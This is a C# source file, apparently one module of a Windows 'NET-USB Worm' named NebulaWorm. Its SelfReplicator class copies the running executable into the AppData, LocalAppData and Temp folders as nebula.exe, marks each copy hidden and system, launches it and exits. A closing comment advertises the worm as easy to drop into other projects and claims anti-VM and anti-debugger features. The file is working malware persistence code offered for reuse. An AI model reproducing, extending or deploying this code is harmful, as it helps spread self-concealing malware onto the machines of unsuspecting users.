using System;
using System.Diagnostics;
using System.IO;
using System.Threading;

namespace NebulaWorm
{
    internal static class SelfReplicator
    {
        
        private static readonly string[] TargetPaths = new[]
        {
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "nebula.exe"),
            Path.Combine(Path.GetTempPath(), "nebula.exe"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "nebula.exe")
        };

        public static void CopyToAppDataIfNeeded()
        {
            string current = Process.GetCurrentProcess().MainModule.FileName;

            foreach (var target in TargetPaths)
            {
                try
                {
           
                    if (PathsEqual(current, target))
                        return;

                    if (File.Exists(target))
                    {
                        FileInfo fiCurrent = new FileInfo(current);
                        FileInfo fiTarget = new FileInfo(target);

                        if (fiCurrent.Length == fiTarget.Length)
                        {
                
                            Process.Start(target);
                            Environment.Exit(0);
                            return;
                        }
                    }

            
                    File.Copy(current, target, true);

         
                    File.SetAttributes(target, FileAttributes.Hidden | FileAttributes.System);

             
                    Process.Start(target);

           
                    Environment.Exit(0);
                }
                catch (IOException)
                {
         
                    Thread.Sleep(300);
                }
                catch (UnauthorizedAccessException)
                {
     
                    continue;
                }
                catch
                {
      
                    continue;
                }
            }
        }


        private static bool PathsEqual(string path1, string path2)
        {
            return string.Equals(
                Path.GetFullPath(path1).TrimEnd('\\'),
                Path.GetFullPath(path2).TrimEnd('\\'),
                StringComparison.OrdinalIgnoreCase);
        }
    }
}
// made by github.com/keegan31 C# NET-USB Worm
// this worm is can be easily modified or added to another Project As A Module
//every code is simple lines of code Has Anti VM Anti Debugger